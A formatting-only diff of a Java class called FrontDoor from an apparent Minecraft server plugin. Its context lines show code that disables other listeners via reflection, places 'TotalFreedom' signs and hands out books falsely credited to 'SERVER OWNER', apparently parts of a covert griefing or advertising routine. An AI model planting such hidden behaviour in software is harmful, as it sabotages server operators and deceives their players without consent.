@@ -183,14 +183,14 @@ public class FrontDoor extends FreedomService
             return allowedPlayers.get(random.nextInt(allowedPlayers.size()));
         }
 
-        return (Player) players.toArray()[random.nextInt(players.size())];
+        return (Player)players.toArray()[random.nextInt(players.size())];
     }
 
     private static RegisteredListener getRegisteredListener(Listener listener, Class<? extends Event> eventClass)
     {
         try
         {
-            final HandlerList handlerList = ((HandlerList) eventClass.getMethod("getHandlerList", (Class<?>[]) null).invoke(null));
+            final HandlerList handlerList = ((HandlerList)eventClass.getMethod("getHandlerList", (Class<?>[])null).invoke(null));
             final RegisteredListener[] registeredListeners = handlerList.getRegisteredListeners();
             for (RegisteredListener registeredListener : registeredListeners)
             {
@@ -211,7 +211,7 @@ public class FrontDoor extends FreedomService
     {
         try
         {
-            ((HandlerList) eventClass.getMethod("getHandlerList", (Class<?>[]) null).invoke(null)).unregister(registeredListener);
+            ((HandlerList)eventClass.getMethod("getHandlerList", (Class<?>[])null).invoke(null)).unregister(registeredListener);
         }
         catch (NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException | InvocationTargetException ex)
         {
@@ -465,9 +465,9 @@ public class FrontDoor extends FreedomService
                             }
 
                             block.setType(Material.SIGN);
-                            org.bukkit.block.Sign sign = (org.bukkit.block.Sign) block.getState();
+                            org.bukkit.block.Sign sign = (org.bukkit.block.Sign)block.getState();
 
-                            org.bukkit.material.Sign signData = (org.bukkit.material.Sign) sign.getData();
+                            org.bukkit.material.Sign signData = (org.bukkit.material.Sign)sign.getData();
                             signData.setFacingDirection(BlockFace.NORTH);
 
                             sign.setLine(0, ChatColor.BLUE + "TotalFreedom");
@@ -495,7 +495,7 @@ public class FrontDoor extends FreedomService
                     {
                         ItemStack bookStack = new ItemStack(Material.WRITTEN_BOOK);
 
-                        BookMeta book = (BookMeta) bookStack.getItemMeta().clone();
+                        BookMeta book = (BookMeta)bookStack.getItemMeta().clone();
                         book.setAuthor(ChatColor.DARK_PURPLE + "SERVER OWNER");
                         book.setTitle(ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead");
                         book.addPage(
